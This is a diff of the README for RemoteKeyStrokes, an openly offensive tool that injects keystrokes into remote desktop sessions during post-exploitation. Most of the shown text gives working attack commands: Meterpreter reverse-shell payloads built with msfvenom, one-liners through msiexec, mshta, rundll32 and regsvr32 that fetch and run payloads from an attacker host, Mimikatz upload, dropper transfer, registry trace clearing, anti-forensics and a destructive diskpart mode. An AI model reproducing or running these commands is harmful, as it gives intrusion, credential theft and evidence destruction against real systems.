@@ -1,12 +1,6 @@
-# Description
+# RemoteKeyStrokes
 
-## Introduction
-
-A script to automate keystrokes through an active remote desktop session that assists offensive operators in combination with living off the land techniques.
-
-## About RemoteKeyStrokes
-
-All credits goes to [nopernik](https://github.com/nopernik) for making it possible so I took it upon myself to improve it. I wanted something that helps during the post exploitation phase when executing commands through a remote desktop. It was also possible for making the [SCPA project](https://github.com/U53RW4R3/SCPA/tree/main/SCPA%20Phases) for collecting resources in a organized matter.
+A script to automate keystrokes through an active remote desktop session that assists offensive operators in combination with living off the land techniques. All credits goes to [nopernik](https://github.com/nopernik) for making it possible so I took it upon myself to improve it. I wanted something that helps during the post exploitation phase when executing commands through a remote desktop. It was also possible for making the [SCPA](https://github.com/ghostsec420/SCPA) project for collecting resources in a organized matter.
 
 ## Features
 
@@ -17,105 +11,22 @@ All credits goes to [nopernik](https://github.com/nopernik) for making it possib
 - Anti-Forensics (Coming soon)
 - Mayhem (Coming soon)
 
-## Install RemoteKeyStrokes
+## Installation
 
 ### Dependencies
 
-#### Requirements for X11
-
-For Debian-based distros.
+Install the rest of the dependencies according to your package mananger.
 
 ```
 $ sudo apt install -y xfreerdp-x11 remmina xdotool
-```
 
-For RedHat-based distros.
+$ sudo dnf install -y xdotool freerdp-2 remmina
 
-```
-$ sudo dnf install xdotool freerdp-2 remmina
-```
-
-For Arch-based distros.
-
-```
 $ sudo pacman -S freerdp remmina xdotool
-```
 
-For Gentoo-based distros.
+$ sudo emerge xwayland freerdp remmina xdotool
 
-```
-$ sudo emerge freerdp remmina xdotool
-```
-
-For NixOS-based distros.
-
-```
-$ sudo nix-env -iA nixpkgs.xdotool nixpkgs.freerdp nixpkgs.remmina
-```
-
-#### Requirements for Wayland (This is limited to KDE Desktop Environment)
-
-This includes dependencies to compile `kdotool`. I tried to find the universal program to match window names but so far only KDE works.
-
-For Debian-based distros.
-
-```
-$ sudo apt install -y freerdp2-wayland remmina libdbus-1-dev pkg-config libxkbcommon-dev libwayland-dev scdoc
-```
-
-For RedHat-based distros.
-
-```
-$ sudo dnf install freerdp-2 remmina dbus-devel pkg-config libxkbcommon-devel wayland-devel scdoc
-```
-
-For Arch-based distros.
-
-```
-$ sudo pacman -S --noconfirm freerdp remmina dbus pkg-config libxkbcommon wayland scdoc
-```
-
-For Gentoo-based distros.
-
-```
-$ sudo emerge freerdp remmina dbus pkg-config libxkbcommon wayland scdoc
-```
-
-For NixOS-based distros.
-
-```
-$ sudo nix-env -iA nixpkgs.freerdp nixpkgs.remmina nixpkgs.dbus nixpkgs.pkg-config nixpkgs.libxkbcommon nixpkgs.wayland nixpkgs.scdoc
-```
-
-Follow the instructions to install rust compiler.
-
-```
-$ curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
-```
-
-##### Compile and install `kdotool`
-
-Compile `kdotool` and install it to the system.
-
-```
-$ git clone https://github.com/jinliu/kdotool && cd kdotool && \
-rustup default stable && cargo b -r && \
-sudo cp target/release/kdotool /usr/local/bin/
-```
-
-##### Compile and install `dotool`
-
-Follow the [instructions (click here)](https://go.dev/doc/install) to install the `go` compiler. This is universal but limited to keystrokes and mouse input.
-
-```
-$ git clone https://git.sr.ht/~geb/dotool && cd dotool && \
-./build.sh && sudo ./build.sh install
-
-$ groupadd -f input
-
-$ sudo usermod -aG input $USER
-
-$ reboot
+$ sudo nix-env -iA nixpkgs.xwayland nixpkgs.xdotool nixpkgs.freerdp nixpkgs.remmina
 ```
 
 ### Setup
@@ -123,9 +34,10 @@ $ reboot
 Install the program in the system and create `rks` as a symbolic link of `remotekeystrokes`. This will be used as an command alias.
 
 ```
-$ sudo wget -O /usr/local/bin/remotekeystrokes https://raw.githubusercontent.com/U53RW4R3/RemoteKeyStrokes/main/remotekeystrokes.sh && \
-sudo ln -sf /usr/local/bin/remotekeystrokes /usr/local/bin/rks && \
-sudo chmod 755 /usr/local/bin/remotekeystrokes /usr/local/bin/rks
+$ sudo wget -O /usr/local/src/remotekeystrokes.sh https://raw.githubusercontent.com/U53RW4R3/RemoteKeyStrokes/main/remotekeystrokes.sh && \
+sudo ln -sf /usr/local/src/remotekeystrokes.sh /usr/local/bin/remotekeystrokes && \
+sudo ln -sf /usr/local/src/remotekeystrokes.sh /usr/local/bin/rks && \
+sudo chmod 755 /usr/local/src/remotekeystrokes.sh /usr/local/bin/remotekeystrokes /usr/local/bin/rks
 ```
 
 ## Help Menu
@@ -220,7 +132,7 @@ $ telnet <IP> [PORT]
 
 #### When using RemoteKeyStrokes
 
-To use `remotekeystrokes` (or an alias command `rks`) when executing commands on the Windows target with authenticated remote session. Before executing them you must navigate it with a window name (`-w`) by default it'll search for `FreeRDP` when using `xfreerdp` (for x11) or `wlfreerdp` (for wayland) if not specified. When targeting systems with a different remote login program be sure to specify the window name. Specify `-c` flag to issue commands. You can also prepare a text file to insert commands and it'll read them one by one. The flag will check if it's a string or a file.
+To use `remotekeystrokes` (or an alias command `rks`) when executing commands on the Windows target with authenticated remote session. Before executing them you must navigate it with a window name (`-w`) by default it'll search for `FreeRDP` when using `xfreerdp`. When targeting systems with a different remote login program be sure to specify the window name. Specify `-c` flag to issue commands. You can also prepare a text file to insert commands and it'll read them one by one. The flag will check if it's a string or a file.
 
 For graphical remote desktop programs such as, FreeRDP, Remmina, and other third party programs. Unlike remote terminal sessions like `telnet` and `ssh`. You must navigate the cursor to an active application inside the target machine. For instance in Windows environment you must open a command prompt (`cmd.exe`) or powershell (`powershell.exe`). It is possible for Windows to open programs with a dialogue box (`-m dialogbox`) for a quick launch. Ensure to clear traces from the registry entry when you initially executed with the method. It's located in `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`. You'll see examples of how you'll be able to perform quick offensive measures with just Living off the Land (LotL) techniques.
 
@@ -239,22 +151,22 @@ ipconfig /all
 systeminfo
 
 $ rks -c "cmd.exe" -m dialogbox
-[INFO] Checking one of the lines reaches 260 character limit
-[PROG] Executing commands...
-[DONE] Task completed!
+[*] Checking one of the lines reaches 260 character limit
+[*] Executing commands...
+[+] Task completed!
 
 $ rks -c recon_local_enum_cmds.txt
-[PROG] Executing commands...
-[DONE] Task completed!
+[*] Executing commands...
+[+] Task completed!
 ```
 
 To execute in a single command. This is concise especially when using with a dialbog box.
 
 ```
 $ rks -c "cmd.exe /k \"whoami /all & net user & net localgroup Administrators & ipconfig /all & systeminfo\"" -m dialogbox
-[INFO] Checking one of the lines reaches 260 character limit
-[PROG] Executing commands...
-[DONE] Task completed!
+[*] Checking one of the lines reaches 260 character limit
+[*] Executing commands...
+[+] Task completed!
 ```
 Active directory enumeration.
 
@@ -266,22 +178,22 @@ net group "Enterprise Admins" /domain
 net group "Domain Computers" /domain
 
 $ rks -c "cmd.exe" -m dialogbox
-[INFO] Checking one of the lines reaches 260 character limit
-[PROG] Executing commands...
-[DONE] Task completed!
+[*] Checking one of the lines reaches 260 character limit
+[*] Executing commands...
+[+] Task completed!
 
 $ rks -c recon_ad_enum_cmds.txt
-[PROG] Executing commands...
-[DONE] Task completed!
+[*] Executing commands...
+[+] Task completed!
 ```
 
 To execute in a single command. This is concise especially when using with a dialbog box.
 
 ```
 $ rks -c "cmd.exe /k \"net user /domain & net group \"Domain Admins\" /domain & net group \"Enterprise Admins\" /domain & net group \"Domain Computers\" /domain\""
-[INFO] Checking one of the lines reaches 260 character limit
-[PROG] Executing commands...
-[DONE] Task completed!
+[*] Checking one of the lines reaches 260 character limit
+[*] Executing commands...
+[+] Task completed!
 ```
 
 #### Powershell
@@ -306,66 +218,66 @@ $ rks -c "powershell.exe" -m dialogbox
 $ rks -c recon_ad_enum_cmdlets.txt
 ```
 
-### 0x02 - Execute Implant
+### 0x02 - Execute Payload
 
 #### Windows
 
-Execute an implant while reading the contents of the payload in powershell.
+Execute the payload while reading the contents of the powershell.
 
 ```
-$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f psh -o implant.ps1
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f psh -o payload.ps1
 
-$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport <PORT>; exploit"
+$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport <PORT>; run"
 
 $ rks -c "powershell.exe" -m dialogbox
 
-$ rks -c implant.ps1
+$ rks -c payload.ps1
 ```
 
-Execute an powershell oneliner implant using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.
+Execute an powershell oneliner payload using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.
 
 ```
-$ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set target 2; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath implant; exploit"
+$ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set target 2; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath payload; run"
 
 $ rks -c "cmd.exe" -m dialogbox
 
 $ rks -c "powershell.exe -nop -w hidden -e <base64_payload>"
 ```
 
-Execute an implant with `msiexec.exe` while hosting a webserver.
+Execute the payload with `msiexec.exe` while hosting a webserver.
 
 ```
-$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f msi -o implant.msi
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f msi -o payload.msi
 
-$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport <PORT>; exploit"
+$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport <PORT>; run"
 
 $ sudo python -m http.server 80
 
-$ rks -c "msiexec /quiet /qn /i http://<attacker_IP>/implant.msi" -m dialogbox
+$ rks -c "msiexec /quiet /qn /i http://<attacker_IP>/payload.msi" -m dialogbox
 ```
 
-Execute an implant with `mshta.exe` using `metasploit-framework` exploit module `exploit/windows/misc/hta_server`.
+Execute the payload with `mshta.exe` using `metasploit-framework` exploit module `exploit/windows/misc/hta_server`.
 
 ```
-$ sudo msfconsole -qx "use exploit/windows/misc/hta_server; set target 2; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvhost <server_IP>; set srvport <server_PORT> exploit"
+$ sudo msfconsole -qx "use exploit/windows/misc/hta_server; set target 2; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvhost <server_IP>; set srvport <server_PORT> run"
 
-$ rks -c "mshta.exe http://<attacker_IP>:<attacker_PORT>/implant.hta" -m dialogbox
+$ rks -c "mshta.exe http://<attacker_IP>:<attacker_PORT>/payload.hta" -m dialogbox
 ```
 
-Execute an implant with `rundll32.exe` using `metasploit-framework` exploit module `exploit/windows/smb/smb_delivery`.
+Execute the payload with `rundll32.exe` using `metasploit-framework` exploit module `exploit/windows/smb/smb_delivery`.
 
 ```
-$ sudo msfconsole -qx "use exploit/windows/smb/smb_delivery; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set file_name implant.dll; set share data; exploit"
+$ sudo msfconsole -qx "use exploit/windows/smb/smb_delivery; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set file_name payload.dll; set share staging; run"
 
-$ rks -c "rundll32.exe \\<attacker_IP>\data\implant.dll,0" -m dialogbox
+$ rks -c "rundll32.exe \\<attacker_IP>\staging\payload.dll,0" -m dialogbox
 ```
 
-Execute an implant with `regsvr32.exe` using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.
+Execute the payload with `regsvr32.exe` using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.
 
 ```
-$ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set target 3; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath implant; exploit"
+$ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set target 3; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath payload; run"
 
-$ rks -c "regsvr32 /s /n /u /i://http://<attacker_IP>:<attacker_PORT>/implant.sct scrobj.dll" -m dialogbox
+$ rks -c "regsvr32 /s /n /u /i://http://<attacker_IP>:<attacker_PORT>/payload.sct scrobj.dll" -m dialogbox
 ```
 
 #### Cross Platform
@@ -373,7 +285,7 @@ $ rks -c "regsvr32 /s /n /u /i://http://<attacker_IP>:<attacker_PORT>/implant.sc
 Execute and implant with `python` using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.
 
 ```
-$ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set payload python/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath implant; exploit"
+$ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set target 0; set payload python/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath payload; run"
 
 $ rks -c "python -c \"<payload>\""
 ```
@@ -402,14 +314,14 @@ Upload a file remotely when pivoting in a isolated network. If you want to speci
 $ rks -c "powershell.exe" -m dialogbox
 
 $ rks -i Invoke-Mimikatz.ps1 -o "C:\Windows\Temp\update.ps1" -m pwshb64
-[PROG] Transferring file...
-[DONE] File transferred!
+[*] Transferring file...
+[+] File transferred!
 ```
 
 To transfer droppers you can use `CertUtil.exe` base64 especially if it's large.
 
 ```
-$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=8443 -f exe -o implant.exe
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=8443 -f exe -o payload.exe
 ```
 
 To transfer droppers with powershell via `CertUtil.exe` base64.
@@ -417,7 +329,7 @@ To transfer droppers with powershell via `CertUtil.exe` base64.
 ```
 $ rks -c "powershell.exe" -m dialogbox
 
-$ rks -i implant.exe -o implant.exe -m outfileb64
+$ rks -i payload.exe -o payload.exe -m outfileb64
 ```
 
 It's also possible for legacy operating systems to transfer files such as, **Windows XP** that lacks powershell except for command prompt.
@@ -425,15 +337,15 @@ It's also possible for legacy operating systems to transfer files such as, **Win
 ```
 $ rks -c "cmd.exe" -m dialogbox
 
-$ rks -i implant.exe -o implant.exe -m cmdb64
+$ rks -i payload.exe -o payload.exe -m cmdb64
 ```
 
-Activate your C2 listener and execute the implant.
+Activate your C2 listener and execute the payload.
 
 ```
-$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp set lhost <IP>; set lport 8443; exploit"
+$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp set lhost <IP>; set lport 8443; run"
 
-$ rks -c ".\implant.exe"
+$ rks -c ".\payload.exe"
 ```
 
 Another way to transfer files especially for sysadmin and offensive tools. Let's take `PsExec64.exe` as an example to requires us for lateral movement. It'll take a long time to upload via text without interruption. Instead the fastest way is to mount the WebDAV that belongs to the legitimate website of sysinternals suite toolkit (`live.sysinternals.com`). Instead of using the file explorer which is much slower than executing commands. Here are the commands for command prompt.
@@ -533,16 +445,16 @@ $ rks -m antiforensics -s winevent
 $ rks -m antiforensics -s eventvwr
 ```
 
-### 0x07 - Miscellaneous
+### 0x07 - Mayhem
 
 Note: WIP (Work In Progress)
 
 ```
-$ rks -m mayhem -s format -s diskpart -a info
+$ rks -m mayhem -s diskpart -a info
 
-$ rks -m mayhem -s format -s diskpart -a cmd
+$ rks -m mayhem -s diskpart -a cmd
 
-$ rks -m mayhem -s format -s diskpart -a pwsh
+$ rks -m mayhem -s diskpart -a pwsh
 ```
 
 ### 0x08 - Specify window name.
@@ -553,44 +465,42 @@ If you're targeting VNC, Telnet, or other network protocols you can specify the 
 $ rks -c implant.ps1 -w <window_name>
 ```
 
-### 0x09 - FAQ (Frequent Asked Questions)
+## FAQ (Frequent Asked Questions)
 
-#### What made me start this project?
+### What made me start this project?
 
 It is painfully slow when I manually type with my keyboard or navigate and click with my mouse especially outside the local network. I just want to speed up the process especially when infiltrating the network.
 
-#### Is it strictly only for graphical remote desktops (i.e. RDP, VNC, etc)?
+### Is it strictly only for graphical remote desktops (i.e. RDP, VNC, etc)?
 
 Not necessarily. I made it possible for remote consoles such as, Telnet since it lacks a feature to transfer files.
 
-#### Can I use the techniques for my project or other tradecraft for my own arsenal?
+### Can I use the techniques for my project or other tradecraft for my own arsenal?
 
-The techniques are common and can be reused for BadUSB, malware development, or other projects related. It's under the copyleft license of the GNU GPLv3 that permits you as the user who have the right to view how the program operates, alter the source code to your requirements, and redistribute to other users along with the source code.
+The techniques are common and can be reused for BadUSB, malware development, or any other projects related. It's under the copyleft license of the GNU GPLv3 that permits you as the user who have the right to view how the program operates, alter the source code to your requirements, and redistribute to other users along with the source code.
 
-#### Is it available for `wayland` display server?
+### Is it available for `wayland` display server?
 
-Yes and I found suitable programs to get it functional but it's limited to KDE desktop environment. I may have to reinvent in **Go** since `dotool` exists to makes my life easier find to focus the part related to match windows names.
+At the moment there isn't any compatiable waylands tools to find an alternative nor a replacement for `xdotool`. [dotool](https://git.sr.ht/~geb/dotool) is highly promising but it's missing a specific feature to focus windows. [kdotool](https://github.com/jinliu/kdotool) is only available for KDE desktop environments. I may have to reinvent it in **Go** (since `dotool` exists) or **Python** with [`pynput`](https://github.com/moses-palmer/pynput) library.
 
 ## Troubleshooting
 
-### Uninstall
+### Offensive Tool Isn't Working
 
-To uninstall the programs.
+When running the program for the first time it should display some self-explanatory messages. Switch to `x11` window server. Refer to the **FAQ** why `wayland` isn't supported.
+
+```
+$ rks -c "powershell.exe" -m searchbox
+[ERROR] Wayland isn't supported!
+[*] Terminating program...
+```
+
+### Uninstall Offensive Tool
+
+To uninstall it.
 
 ```
 $ sudo rm -f /usr/local/bin/remotekeystrokes /usr/local/bin/rks
-```
-
-To uninstall `kdotool`.
-
-```
-$ sudo rm /usr/local/bin/kdotool
-```
-
-To uninstall `dotool`.
-
-```
-$ cd dotool && sudo ./uninstall.sh
 ```
 
 ## TODO and Help Wanted
